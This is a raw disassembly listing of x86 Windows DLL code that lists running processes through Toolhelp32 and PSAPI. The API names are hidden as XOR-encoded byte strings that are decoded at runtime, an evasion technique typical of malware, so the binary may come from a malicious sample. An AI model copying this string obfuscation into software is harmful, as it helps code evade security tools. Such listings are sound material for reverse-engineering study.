100065f6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100065fc:	50                   	push   %eax
100065fd:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006604:	81 ec 94 01 00 00    	sub    $0x194,%esp
1000660a:	53                   	push   %ebx
1000660b:	56                   	push   %esi
1000660c:	57                   	push   %edi
1000660d:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006610:	c6 45 a4 01          	movb   $0x1,-0x5c(%ebp)
10006614:	33 db                	xor    %ebx,%ebx
10006616:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
10006619:	89 5d c8             	mov    %ebx,-0x38(%ebp)
1000661c:	c6 45 98 14          	movb   $0x14,-0x68(%ebp)
10006620:	c6 45 99 1a          	movb   $0x1a,-0x67(%ebp)
10006624:	c6 45 9a 0d          	movb   $0xd,-0x66(%ebp)
10006628:	c6 45 9b 11          	movb   $0x11,-0x65(%ebp)
1000662c:	c6 45 9c 1a          	movb   $0x1a,-0x64(%ebp)
10006630:	c6 45 9d 13          	movb   $0x13,-0x63(%ebp)
10006634:	c6 45 9e 4c          	movb   $0x4c,-0x62(%ebp)
10006638:	c6 45 9f 4d          	movb   $0x4d,-0x61(%ebp)
1000663c:	88 5d a0             	mov    %bl,-0x60(%ebp)
1000663f:	c6 45 cc 3c          	movb   $0x3c,-0x34(%ebp)
10006643:	c6 45 cd 0d          	movb   $0xd,-0x33(%ebp)
10006647:	c6 45 ce 1a          	movb   $0x1a,-0x32(%ebp)
1000664b:	c6 45 cf 1e          	movb   $0x1e,-0x31(%ebp)
1000664f:	c6 45 d0 0b          	movb   $0xb,-0x30(%ebp)
10006653:	c6 45 d1 1a          	movb   $0x1a,-0x2f(%ebp)
10006657:	c6 45 d2 2b          	movb   $0x2b,-0x2e(%ebp)
1000665b:	c6 45 d3 10          	movb   $0x10,-0x2d(%ebp)
1000665f:	c6 45 d4 10          	movb   $0x10,-0x2c(%ebp)
10006663:	c6 45 d5 13          	movb   $0x13,-0x2b(%ebp)
10006667:	c6 45 d6 17          	movb   $0x17,-0x2a(%ebp)
1000666b:	c6 45 d7 1a          	movb   $0x1a,-0x29(%ebp)
1000666f:	c6 45 d8 13          	movb   $0x13,-0x28(%ebp)
10006673:	c6 45 d9 0f          	movb   $0xf,-0x27(%ebp)
10006677:	c6 45 da 4c          	movb   $0x4c,-0x26(%ebp)
1000667b:	c6 45 db 4d          	movb   $0x4d,-0x25(%ebp)
1000667f:	c6 45 dc 2c          	movb   $0x2c,-0x24(%ebp)
10006683:	c6 45 dd 11          	movb   $0x11,-0x23(%ebp)
10006687:	c6 45 de 1e          	movb   $0x1e,-0x22(%ebp)
1000668b:	c6 45 df 0f          	movb   $0xf,-0x21(%ebp)
1000668f:	c6 45 e0 0c          	movb   $0xc,-0x20(%ebp)
10006693:	c6 45 e1 17          	movb   $0x17,-0x1f(%ebp)
10006697:	c6 45 e2 10          	movb   $0x10,-0x1e(%ebp)
1000669b:	c6 45 e3 0b          	movb   $0xb,-0x1d(%ebp)
1000669f:	88 5d e4             	mov    %bl,-0x1c(%ebp)
100066a2:	c6 45 a8 2f          	movb   $0x2f,-0x58(%ebp)
100066a6:	c6 45 a9 0d          	movb   $0xd,-0x57(%ebp)
100066aa:	c6 45 aa 10          	movb   $0x10,-0x56(%ebp)
100066ae:	c6 45 ab 1c          	movb   $0x1c,-0x55(%ebp)
100066b2:	c6 45 ac 1a          	movb   $0x1a,-0x54(%ebp)
100066b6:	c6 45 ad 0c          	movb   $0xc,-0x53(%ebp)
100066ba:	c6 45 ae 0c          	movb   $0xc,-0x52(%ebp)
100066be:	c6 45 af 4c          	movb   $0x4c,-0x51(%ebp)
100066c2:	c6 45 b0 4d          	movb   $0x4d,-0x50(%ebp)
100066c6:	c6 45 b1 39          	movb   $0x39,-0x4f(%ebp)
100066ca:	c6 45 b2 16          	movb   $0x16,-0x4e(%ebp)
100066ce:	c6 45 b3 0d          	movb   $0xd,-0x4d(%ebp)
100066d2:	c6 45 b4 0c          	movb   $0xc,-0x4c(%ebp)
100066d6:	c6 45 b5 0b          	movb   $0xb,-0x4b(%ebp)
100066da:	88 5d b6             	mov    %bl,-0x4a(%ebp)
100066dd:	c6 45 b8 2f          	movb   $0x2f,-0x48(%ebp)
100066e1:	c6 45 b9 0d          	movb   $0xd,-0x47(%ebp)
100066e5:	c6 45 ba 10          	movb   $0x10,-0x46(%ebp)
100066e9:	c6 45 bb 1c          	movb   $0x1c,-0x45(%ebp)
100066ed:	c6 45 bc 1a          	movb   $0x1a,-0x44(%ebp)
100066f1:	c6 45 bd 0c          	movb   $0xc,-0x43(%ebp)
100066f5:	c6 45 be 0c          	movb   $0xc,-0x42(%ebp)
100066f9:	c6 45 bf 4c          	movb   $0x4c,-0x41(%ebp)
100066fd:	c6 45 c0 4d          	movb   $0x4d,-0x40(%ebp)
10006701:	c6 45 c1 31          	movb   $0x31,-0x3f(%ebp)
10006705:	c6 45 c2 1a          	movb   $0x1a,-0x3e(%ebp)
10006709:	c6 45 c3 07          	movb   $0x7,-0x3d(%ebp)
1000670d:	c6 45 c4 0b          	movb   $0xb,-0x3c(%ebp)
10006711:	88 5d c5             	mov    %bl,-0x3b(%ebp)
10006714:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006717:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000671e:	8d 45 98             	lea    -0x68(%ebp),%eax
10006721:	50                   	push   %eax
10006722:	e8 c7 0e 00 00       	call   0x100075ee
10006727:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000672a:	50                   	push   %eax
1000672b:	e8 be 0e 00 00       	call   0x100075ee
10006730:	8d 45 a8             	lea    -0x58(%ebp),%eax
10006733:	50                   	push   %eax
10006734:	e8 b5 0e 00 00       	call   0x100075ee
10006739:	8d 45 b8             	lea    -0x48(%ebp),%eax
1000673c:	50                   	push   %eax
1000673d:	e8 ac 0e 00 00       	call   0x100075ee
10006742:	83 c4 10             	add    $0x10,%esp
10006745:	8d 45 98             	lea    -0x68(%ebp),%eax
10006748:	50                   	push   %eax
10006749:	ff 15 14 e1 00 10    	call   *0x1000e114
1000674f:	8b f8                	mov    %eax,%edi
10006751:	89 7d 8c             	mov    %edi,-0x74(%ebp)
10006754:	3b fb                	cmp    %ebx,%edi
10006756:	0f 84 fc 00 00 00    	je     0x10006858
1000675c:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000675f:	50                   	push   %eax
10006760:	57                   	push   %edi
10006761:	8b 35 1c e1 00 10    	mov    0x1000e11c,%esi
10006767:	ff d6                	call   *%esi
10006769:	89 85 5c fe ff ff    	mov    %eax,-0x1a4(%ebp)
1000676f:	8d 45 a8             	lea    -0x58(%ebp),%eax
10006772:	50                   	push   %eax
10006773:	57                   	push   %edi
10006774:	ff d6                	call   *%esi
10006776:	89 85 60 fe ff ff    	mov    %eax,-0x1a0(%ebp)
1000677c:	8d 45 b8             	lea    -0x48(%ebp),%eax
1000677f:	50                   	push   %eax
10006780:	57                   	push   %edi
10006781:	ff d6                	call   *%esi
10006783:	89 45 90             	mov    %eax,-0x70(%ebp)
10006786:	39 9d 5c fe ff ff    	cmp    %ebx,-0x1a4(%ebp)
1000678c:	0f 84 c6 00 00 00    	je     0x10006858
10006792:	39 9d 60 fe ff ff    	cmp    %ebx,-0x1a0(%ebp)
10006798:	0f 84 ba 00 00 00    	je     0x10006858
1000679e:	3b c3                	cmp    %ebx,%eax
100067a0:	0f 84 b2 00 00 00    	je     0x10006858
100067a6:	53                   	push   %ebx
100067a7:	6a 02                	push   $0x2
100067a9:	ff 95 5c fe ff ff    	call   *-0x1a4(%ebp)
100067af:	8b f0                	mov    %eax,%esi
100067b1:	89 75 94             	mov    %esi,-0x6c(%ebp)
100067b4:	83 fe ff             	cmp    $0xffffffff,%esi
100067b7:	0f 84 9b 00 00 00    	je     0x10006858
100067bd:	89 9d 64 fe ff ff    	mov    %ebx,-0x19c(%ebp)
100067c3:	6a 49                	push   $0x49
100067c5:	59                   	pop    %ecx
100067c6:	33 c0                	xor    %eax,%eax
100067c8:	8d bd 68 fe ff ff    	lea    -0x198(%ebp),%edi
100067ce:	f3 ab                	rep stos %eax,%es:(%edi)
100067d0:	c7 85 64 fe ff ff 28 	movl   $0x128,-0x19c(%ebp)
100067d7:	01 00 00 
100067da:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
100067e0:	50                   	push   %eax
100067e1:	56                   	push   %esi
100067e2:	ff 95 60 fe ff ff    	call   *-0x1a0(%ebp)
100067e8:	85 c0                	test   %eax,%eax
100067ea:	ff 75 08             	push   0x8(%ebp)
100067ed:	74 49                	je     0x10006838
100067ef:	e8 6c 6b 00 00       	call   0x1000d360
100067f4:	b9 00 10 00 00       	mov    $0x1000,%ecx
100067f9:	2b c8                	sub    %eax,%ecx
100067fb:	51                   	push   %ecx
100067fc:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
10006802:	50                   	push   %eax
10006803:	ff 75 08             	push   0x8(%ebp)
10006806:	8b 3d cc e1 00 10    	mov    0x1000e1cc,%edi
1000680c:	ff d7                	call   *%edi
1000680e:	ff 75 08             	push   0x8(%ebp)
10006811:	e8 4a 6b 00 00       	call   0x1000d360
10006816:	b9 00 10 00 00       	mov    $0x1000,%ecx
1000681b:	2b c8                	sub    %eax,%ecx
1000681d:	51                   	push   %ecx
1000681e:	68 38 01 01 10       	push   $0x10010138
10006823:	ff 75 08             	push   0x8(%ebp)
10006826:	ff d7                	call   *%edi
10006828:	83 c4 20             	add    $0x20,%esp
1000682b:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
10006831:	50                   	push   %eax
10006832:	56                   	push   %esi
10006833:	ff 55 90             	call   *-0x70(%ebp)
10006836:	eb b0                	jmp    0x100067e8
10006838:	e8 23 6b 00 00       	call   0x1000d360
1000683d:	b9 00 10 00 00       	mov    $0x1000,%ecx
10006842:	2b c8                	sub    %eax,%ecx
10006844:	51                   	push   %ecx
10006845:	68 30 01 01 10       	push   $0x10010130
1000684a:	ff 75 08             	push   0x8(%ebp)
1000684d:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10006853:	83 c4 10             	add    $0x10,%esp
10006856:	eb 03                	jmp    0x1000685b
10006858:	88 5d a4             	mov    %bl,-0x5c(%ebp)
1000685b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000685e:	e8 04 00 00 00       	call   0x10006867
10006863:	eb 32                	jmp    0x10006897
10006865:	33 db                	xor    %ebx,%ebx
10006867:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
1000686a:	74 0c                	je     0x10006878
1000686c:	ff 75 c8             	push   -0x38(%ebp)
1000686f:	ff 15 98 e0 00 10    	call   *0x1000e098
10006875:	89 5d c8             	mov    %ebx,-0x38(%ebp)
10006878:	39 5d 94             	cmp    %ebx,-0x6c(%ebp)
1000687b:	74 0c                	je     0x10006889
1000687d:	ff 75 94             	push   -0x6c(%ebp)
10006880:	ff 15 30 e1 00 10    	call   *0x1000e130
10006886:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
10006889:	c3                   	ret
1000688a:	eb 0b                	jmp    0x10006897
1000688c:	6a 01                	push   $0x1
1000688e:	58                   	pop    %eax
1000688f:	c3                   	ret
10006890:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006893:	80 65 a4 00          	andb   $0x0,-0x5c(%ebp)
10006897:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000689b:	8a 45 a4             	mov    -0x5c(%ebp),%al
1000689e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100068a1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100068a8:	5f                   	pop    %edi
100068a9:	5e                   	pop    %esi
100068aa:	5b                   	pop    %ebx
100068ab:	c9                   	leave
100068ac:	c3                   	ret
100068ad:	55                   	push   %ebp
100068ae:	8b ec                	mov    %esp,%ebp
100068b0:	6a ff                	push   $0xffffffff
100068b2:	68 c8 e3 00 10       	push   $0x1000e3c8
100068b7:	68 00 c6 00 10       	push   $0x1000c600
100068bc:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100068c2:	50                   	push   %eax
100068c3:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100068ca:	51                   	push   %ecx
100068cb:	51                   	push   %ecx
100068cc:	b8 38 11 00 00       	mov    $0x1138,%eax
100068d1:	e8 5a 6a 00 00       	call   0x1000d330
100068d6:	53                   	push   %ebx
100068d7:	56                   	push   %esi
100068d8:	57                   	push   %edi
100068d9:	89 65 e8             	mov    %esp,-0x18(%ebp)
100068dc:	c6 45 e4 01          	movb   $0x1,-0x1c(%ebp)
100068e0:	c6 45 c8 0f          	movb   $0xf,-0x38(%ebp)
100068e4:	c6 45 c9 0c          	movb   $0xc,-0x37(%ebp)
100068e8:	c6 45 ca 1e          	movb   $0x1e,-0x36(%ebp)
100068ec:	c6 45 cb 0f          	movb   $0xf,-0x35(%ebp)
100068f0:	c6 45 cc 16          	movb   $0x16,-0x34(%ebp)
100068f4:	33 db                	xor    %ebx,%ebx
100068f6:	88 5d cd             	mov    %bl,-0x33(%ebp)
100068f9:	c6 45 d4 3a          	movb   $0x3a,-0x2c(%ebp)
100068fd:	c6 45 d5 11          	movb   $0x11,-0x2b(%ebp)
10006901:	c6 45 d6 0a          	movb   $0xa,-0x2a(%ebp)
10006905:	c6 45 d7 12          	movb   $0x12,-0x29(%ebp)
10006909:	c6 45 d8 2f          	movb   $0x2f,-0x28(%ebp)
1000690d:	c6 45 d9 0d          	movb   $0xd,-0x27(%ebp)
10006911:	c6 45 da 10          	movb   $0x10,-0x26(%ebp)
10006915:	c6 45 db 1c          	movb   $0x1c,-0x25(%ebp)
10006919:	c6 45 dc 1a          	movb   $0x1a,-0x24(%ebp)
1000691d:	c6 45 dd 0c          	movb   $0xc,-0x23(%ebp)
10006921:	c6 45 de 0c          	movb   $0xc,-0x22(%ebp)
10006925:	c6 45 df 1a          	movb   $0x1a,-0x21(%ebp)
10006929:	c6 45 e0 0c          	movb   $0xc,-0x20(%ebp)
1000692d:	88 5d e1             	mov    %bl,-0x1f(%ebp)
10006930:	89 5d d0             	mov    %ebx,-0x30(%ebp)
10006933:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006936:	6a 01                	push   $0x1
10006938:	5e                   	pop    %esi
10006939:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000693c:	8d 45 c8             	lea    -0x38(%ebp),%eax
1000693f:	50                   	push   %eax
10006940:	e8 a9 0c 00 00       	call   0x100075ee
10006945:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10006948:	50                   	push   %eax
10006949:	e8 a0 0c 00 00       	call   0x100075ee
1000694e:	59                   	pop    %ecx
1000694f:	59                   	pop    %ecx
10006950:	8d 45 c8             	lea    -0x38(%ebp),%eax
10006953:	50                   	push   %eax
10006954:	ff 15 14 e1 00 10    	call   *0x1000e114
1000695a:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000695d:	3b c3                	cmp    %ebx,%eax
1000695f:	74 15                	je     0x10006976
10006961:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
10006964:	51                   	push   %ecx
10006965:	50                   	push   %eax
10006966:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000696c:	89 85 c0 ef ff ff    	mov    %eax,-0x1040(%ebp)
10006972:	3b c3                	cmp    %ebx,%eax
10006974:	75 08                	jne    0x1000697e
10006976:	88 5d e4             	mov    %bl,-0x1c(%ebp)
10006979:	e9 da 00 00 00       	jmp    0x10006a58
1000697e:	89 9d c4 ef ff ff    	mov    %ebx,-0x103c(%ebp)
10006984:	8d 8d c4 ef ff ff    	lea    -0x103c(%ebp),%ecx
1000698a:	51                   	push   %ecx
1000698b:	bf 00 10 00 00       	mov    $0x1000,%edi
10006990:	57                   	push   %edi
10006991:	8d 8d c8 ef ff ff    	lea    -0x1038(%ebp),%ecx
10006997:	51                   	push   %ecx
10006998:	ff d0                	call   *%eax
1000699a:	3b c6                	cmp    %esi,%eax
1000699c:	0f 85 9a 00 00 00    	jne    0x10006a3c
100069a2:	8b b5 c4 ef ff ff    	mov    -0x103c(%ebp),%esi
100069a8:	c1 ee 02             	shr    $0x2,%esi
100069ab:	89 b5 b0 ee ff ff    	mov    %esi,-0x1150(%ebp)
100069b1:	68 05 01 00 00       	push   $0x105
100069b6:	53                   	push   %ebx
100069b7:	8d 85 b4 ee ff ff    	lea    -0x114c(%ebp),%eax
100069bd:	50                   	push   %eax
100069be:	e8 53 69 00 00       	call   0x1000d316
100069c3:	83 c4 0c             	add    $0xc,%esp
100069c6:	89 9d bc ef ff ff    	mov    %ebx,-0x1044(%ebp)
100069cc:	8b 85 bc ef ff ff    	mov    -0x1044(%ebp),%eax
100069d2:	3b c6                	cmp    %esi,%eax
100069d4:	73 66                	jae    0x10006a3c
100069d6:	68 04 01 00 00       	push   $0x104
100069db:	8d 8d b4 ee ff ff    	lea    -0x114c(%ebp),%ecx
100069e1:	51                   	push   %ecx
100069e2:	ff b4 85 c8 ef ff ff 	push   -0x1038(%ebp,%eax,4)
100069e9:	8d 45 d0             	lea    -0x30(%ebp),%eax
100069ec:	50                   	push   %eax
100069ed:	e8 a3 00 00 00       	call   0x10006a95
100069f2:	83 c4 10             	add    $0x10,%esp
100069f5:	3c 01                	cmp    $0x1,%al
100069f7:	75 3b                	jne    0x10006a34
100069f9:	ff 75 08             	push   0x8(%ebp)
100069fc:	e8 5f 69 00 00       	call   0x1000d360
10006a01:	8b cf                	mov    %edi,%ecx
10006a03:	2b c8                	sub    %eax,%ecx
10006a05:	51                   	push   %ecx
10006a06:	8d 85 b4 ee ff ff    	lea    -0x114c(%ebp),%eax
10006a0c:	50                   	push   %eax
10006a0d:	ff 75 08             	push   0x8(%ebp)
10006a10:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10006a16:	ff 75 08             	push   0x8(%ebp)
10006a19:	e8 42 69 00 00       	call   0x1000d360
10006a1e:	8b cf                	mov    %edi,%ecx
10006a20:	2b c8                	sub    %eax,%ecx
10006a22:	51                   	push   %ecx
10006a23:	68 38 01 01 10       	push   $0x10010138
10006a28:	ff 75 08             	push   0x8(%ebp)
10006a2b:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10006a31:	83 c4 20             	add    $0x20,%esp
10006a34:	ff 85 bc ef ff ff    	incl   -0x1044(%ebp)
10006a3a:	eb 90                	jmp    0x100069cc
10006a3c:	ff 75 08             	push   0x8(%ebp)
10006a3f:	e8 1c 69 00 00       	call   0x1000d360
10006a44:	2b f8                	sub    %eax,%edi
10006a46:	57                   	push   %edi
10006a47:	68 30 01 01 10       	push   $0x10010130
10006a4c:	ff 75 08             	push   0x8(%ebp)
10006a4f:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10006a55:	83 c4 10             	add    $0x10,%esp
10006a58:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006a5b:	e8 04 00 00 00       	call   0x10006a64
10006a60:	eb 1d                	jmp    0x10006a7f
10006a62:	33 db                	xor    %ebx,%ebx
10006a64:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
10006a67:	74 0c                	je     0x10006a75
10006a69:	ff 75 d0             	push   -0x30(%ebp)
10006a6c:	ff 15 98 e0 00 10    	call   *0x1000e098
10006a72:	89 5d d0             	mov    %ebx,-0x30(%ebp)
10006a75:	c3                   	ret
10006a76:	eb 07                	jmp    0x10006a7f
10006a78:	6a 01                	push   $0x1
10006a7a:	58                   	pop    %eax
10006a7b:	c3                   	ret
10006a7c:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006a7f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10006a83:	8a 45 e4             	mov    -0x1c(%ebp),%al
10006a86:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006a89:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006a90:	5f                   	pop    %edi
10006a91:	5e                   	pop    %esi
10006a92:	5b                   	pop    %ebx
10006a93:	c9                   	leave
10006a94:	c3                   	ret
10006a95:	55                   	push   %ebp
10006a96:	8b ec                	mov    %esp,%ebp
10006a98:	6a ff                	push   $0xffffffff
10006a9a:	68 e0 e3 00 10       	push   $0x1000e3e0
10006a9f:	68 00 c6 00 10       	push   $0x1000c600
10006aa4:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10006aaa:	50                   	push   %eax
10006aab:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006ab2:	83 ec 50             	sub    $0x50,%esp
10006ab5:	53                   	push   %ebx
10006ab6:	56                   	push   %esi
10006ab7:	57                   	push   %edi
10006ab8:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006abb:	c6 45 e4 01          	movb   $0x1,-0x1c(%ebp)
10006abf:	33 db                	xor    %ebx,%ebx
10006ac1:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006ac4:	c6 45 cc 3a          	movb   $0x3a,-0x34(%ebp)
10006ac8:	c6 45 cd 11          	movb   $0x11,-0x33(%ebp)
10006acc:	c6 45 ce 0a          	movb   $0xa,-0x32(%ebp)
10006ad0:	c6 45 cf 12          	movb   $0x12,-0x31(%ebp)
10006ad4:	c6 45 d0 2f          	movb   $0x2f,-0x30(%ebp)
10006ad8:	c6 45 d1 0d          	movb   $0xd,-0x2f(%ebp)
10006adc:	c6 45 d2 10          	movb   $0x10,-0x2e(%ebp)
10006ae0:	c6 45 d3 1c          	movb   $0x1c,-0x2d(%ebp)
10006ae4:	c6 45 d4 1a          	movb   $0x1a,-0x2c(%ebp)
10006ae8:	c6 45 d5 0c          	movb   $0xc,-0x2b(%ebp)
10006aec:	c6 45 d6 0c          	movb   $0xc,-0x2a(%ebp)
10006af0:	c6 45 d7 32          	movb   $0x32,-0x29(%ebp)
10006af4:	c6 45 d8 10          	movb   $0x10,-0x28(%ebp)
10006af8:	c6 45 d9 1b          	movb   $0x1b,-0x27(%ebp)
10006afc:	c6 45 da 0a          	movb   $0xa,-0x26(%ebp)
10006b00:	c6 45 db 13          	movb   $0x13,-0x25(%ebp)
10006b04:	c6 45 dc 1a          	movb   $0x1a,-0x24(%ebp)
10006b08:	c6 45 dd 0c          	movb   $0xc,-0x23(%ebp)
10006b0c:	88 5d de             	mov    %bl,-0x22(%ebp)
10006b0f:	c6 45 b0 38          	movb   $0x38,-0x50(%ebp)
10006b13:	c6 45 b1 1a          	movb   $0x1a,-0x4f(%ebp)
10006b17:	c6 45 b2 0b          	movb   $0xb,-0x4e(%ebp)
10006b1b:	c6 45 b3 32          	movb   $0x32,-0x4d(%ebp)
10006b1f:	c6 45 b4 10          	movb   $0x10,-0x4c(%ebp)
10006b23:	c6 45 b5 1b          	movb   $0x1b,-0x4b(%ebp)
10006b27:	c6 45 b6 0a          	movb   $0xa,-0x4a(%ebp)
10006b2b:	c6 45 b7 13          	movb   $0x13,-0x49(%ebp)
10006b2f:	c6 45 b8 1a          	movb   $0x1a,-0x48(%ebp)
10006b33:	c6 45 b9 3d          	movb   $0x3d,-0x47(%ebp)
10006b37:	c6 45 ba 1e          	movb   $0x1e,-0x46(%ebp)
10006b3b:	c6 45 bb 0c          	movb   $0xc,-0x45(%ebp)
10006b3f:	c6 45 bc 1a          	movb   $0x1a,-0x44(%ebp)
10006b43:	c6 45 bd 31          	movb   $0x31,-0x43(%ebp)
10006b47:	c6 45 be 1e          	movb   $0x1e,-0x42(%ebp)
10006b4b:	c6 45 bf 12          	movb   $0x12,-0x41(%ebp)
10006b4f:	c6 45 c0 1a          	movb   $0x1a,-0x40(%ebp)
10006b53:	c6 45 c1 3e          	movb   $0x3e,-0x3f(%ebp)
10006b57:	88 5d c2             	mov    %bl,-0x3e(%ebp)
10006b5a:	c6 45 c4 0a          	movb   $0xa,-0x3c(%ebp)
10006b5e:	c6 45 c5 11          	movb   $0x11,-0x3b(%ebp)
10006b62:	c6 45 c6 14          	movb   $0x14,-0x3a(%ebp)
10006b66:	c6 45 c7 11          	movb   $0x11,-0x39(%ebp)
10006b6a:	c6 45 c8 10          	movb   $0x10,-0x38(%ebp)
10006b6e:	c6 45 c9 08          	movb   $0x8,-0x37(%ebp)
10006b72:	c6 45 ca 11          	movb   $0x11,-0x36(%ebp)
10006b76:	88 5d cb             	mov    %bl,-0x35(%ebp)
10006b79:	39 5d 10             	cmp    %ebx,0x10(%ebp)
10006b7c:	75 07                	jne    0x10006b85
10006b7e:	32 c0                	xor    %al,%al
10006b80:	e9 ed 00 00 00       	jmp    0x10006c72
10006b85:	ff 75 14             	push   0x14(%ebp)
10006b88:	53                   	push   %ebx
10006b89:	ff 75 10             	push   0x10(%ebp)
10006b8c:	e8 85 67 00 00       	call   0x1000d316
10006b91:	83 c4 0c             	add    $0xc,%esp
10006b94:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006b97:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10006b9e:	8d 45 cc             	lea    -0x34(%ebp),%eax
10006ba1:	50                   	push   %eax
10006ba2:	e8 47 0a 00 00       	call   0x100075ee
10006ba7:	8d 45 b0             	lea    -0x50(%ebp),%eax
10006baa:	50                   	push   %eax
10006bab:	e8 3e 0a 00 00       	call   0x100075ee
10006bb0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10006bb3:	50                   	push   %eax
10006bb4:	e8 35 0a 00 00       	call   0x100075ee
10006bb9:	83 c4 0c             	add    $0xc,%esp
10006bbc:	8d 45 cc             	lea    -0x34(%ebp),%eax
10006bbf:	50                   	push   %eax
10006bc0:	8b 7d 08             	mov    0x8(%ebp),%edi
10006bc3:	ff 37                	push   (%edi)
10006bc5:	8b 35 1c e1 00 10    	mov    0x1000e11c,%esi
10006bcb:	ff d6                	call   *%esi
10006bcd:	89 45 ac             	mov    %eax,-0x54(%ebp)
10006bd0:	8d 45 b0             	lea    -0x50(%ebp),%eax
10006bd3:	50                   	push   %eax
10006bd4:	ff 37                	push   (%edi)
10006bd6:	ff d6                	call   *%esi
10006bd8:	89 45 a8             	mov    %eax,-0x58(%ebp)
10006bdb:	39 5d ac             	cmp    %ebx,-0x54(%ebp)
10006bde:	74 61                	je     0x10006c41
10006be0:	3b c3                	cmp    %ebx,%eax
10006be2:	74 5d                	je     0x10006c41
10006be4:	8b 45 14             	mov    0x14(%ebp),%eax
10006be7:	8d 70 ff             	lea    -0x1(%eax),%esi
10006bea:	56                   	push   %esi
10006beb:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10006bee:	50                   	push   %eax
10006bef:	ff 75 10             	push   0x10(%ebp)
10006bf2:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10006bf8:	83 c4 0c             	add    $0xc,%esp
10006bfb:	ff 75 0c             	push   0xc(%ebp)
10006bfe:	53                   	push   %ebx
10006bff:	68 10 04 00 00       	push   $0x410
10006c04:	ff 15 b4 e0 00 10    	call   *0x1000e0b4
10006c0a:	8b f8                	mov    %eax,%edi
10006c0c:	89 7d e0             	mov    %edi,-0x20(%ebp)
10006c0f:	3b fb                	cmp    %ebx,%edi
10006c11:	74 2e                	je     0x10006c41
10006c13:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
10006c16:	89 5d a0             	mov    %ebx,-0x60(%ebp)
10006c19:	8d 45 a0             	lea    -0x60(%ebp),%eax
10006c1c:	50                   	push   %eax
10006c1d:	6a 04                	push   $0x4
10006c1f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
10006c22:	50                   	push   %eax
10006c23:	57                   	push   %edi
10006c24:	ff 55 ac             	call   *-0x54(%ebp)
10006c27:	85 c0                	test   %eax,%eax
10006c29:	74 16                	je     0x10006c41
10006c2b:	56                   	push   %esi
10006c2c:	ff 75 10             	push   0x10(%ebp)
10006c2f:	ff 75 a4             	push   -0x5c(%ebp)
10006c32:	57                   	push   %edi
10006c33:	ff 55 a8             	call   *-0x58(%ebp)
10006c36:	f7 d8                	neg    %eax
10006c38:	1b c0                	sbb    %eax,%eax
10006c3a:	f7 d8                	neg    %eax
10006c3c:	88 45 e4             	mov    %al,-0x1c(%ebp)
10006c3f:	eb 03                	jmp    0x10006c44
10006c41:	88 5d e4             	mov    %bl,-0x1c(%ebp)
10006c44:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006c47:	e8 04 00 00 00       	call   0x10006c50
10006c4c:	eb 1d                	jmp    0x10006c6b
10006c4e:	33 db                	xor    %ebx,%ebx
10006c50:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
10006c53:	74 0c                	je     0x10006c61
10006c55:	ff 75 e0             	push   -0x20(%ebp)
10006c58:	ff 15 30 e1 00 10    	call   *0x1000e130
10006c5e:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006c61:	c3                   	ret
10006c62:	eb 07                	jmp    0x10006c6b
10006c64:	6a 01                	push   $0x1
10006c66:	58                   	pop    %eax
10006c67:	c3                   	ret
10006c68:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006c6b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10006c6f:	8a 45 e4             	mov    -0x1c(%ebp),%al
10006c72:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006c75:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006c7c:	5f                   	pop    %edi
10006c7d:	5e                   	pop    %esi
10006c7e:	5b                   	pop    %ebx
10006c7f:	c9                   	leave
10006c80:	c3                   	ret
10006c81:	8b 44 24 04          	mov    0x4(%esp),%eax
10006c85:	83 f8 09             	cmp    $0x9,%eax
10006c88:	77 43                	ja     0x10006ccd
10006c8a:	ff 24 85 d3 6c 00 10 	jmp    *0x10006cd3(,%eax,4)
10006c91:	b8 6c 01 01 10       	mov    $0x1001016c,%eax
10006c96:	c3                   	ret
